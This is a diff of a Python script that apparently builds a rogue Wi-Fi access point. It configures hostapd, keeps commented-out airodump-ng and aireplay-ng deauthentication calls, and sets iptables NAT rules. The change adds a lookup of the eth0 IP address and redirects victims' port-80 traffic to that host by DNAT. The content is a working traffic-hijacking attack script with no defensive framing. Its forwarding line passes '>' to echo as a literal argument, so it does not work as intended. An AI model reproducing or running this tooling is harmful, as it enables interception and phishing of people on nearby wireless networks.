@@ -46,13 +46,22 @@ with open('hostapd.conf', 'w') as f:
 #subprocess.call(['airodump-ng', '--bssid', macAddr, '-w', 'client_bssids', '--output-format', 'csv', 'wlan0mon'])
 #subprocess.call(['aireplay-ng', '--deauth', '20'  , '-a', macAddr, 'wlan0mon'])
 
+
+# Parse localhost IP address
+process1 = subprocess.Popen(['ifconfig', 'eth0'], stdout=subprocess.PIPE)
+process2 = subprocess.Popen(['grep', 'inet '], stdin=process1.stdout, stdout=subprocess.PIPE)
+process3 = subprocess.Popen(['awk', '-F[: ]+', '{ print $3 }'], stdin=process2.stdout, stdout=subprocess.PIPE)
+# IP address in string format
+ipAddr = process3.stdout.read().decode('utf-8')[:-1]
+
+
 # Configure iptables to reroute traffic
 subprocess.call(['ifconfig', 'wlan0mon', 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
 subprocess.call(['route', 'add', '-net', '192.168.1.0', 'netmask', '255.255.255.0', 'gw', '192.168.1.1'])
 subprocess.call(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', 'eth0', '-j', 'MASQUERADE'])
 subprocess.call(['iptables', '--append', 'FORWARD', '--in-interface', 'wlan0mon', '-j', 'ACCEPT'])
 subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
-subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '127.0.0.1:80'])
+subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', ipAddr + ':80'])
 subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])
 #subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-p', 'tcp', '-d', '192.168.1.125', '--dport', '80', '-j', 'SNAT', '--to-source', '192.168.1.1'])
 
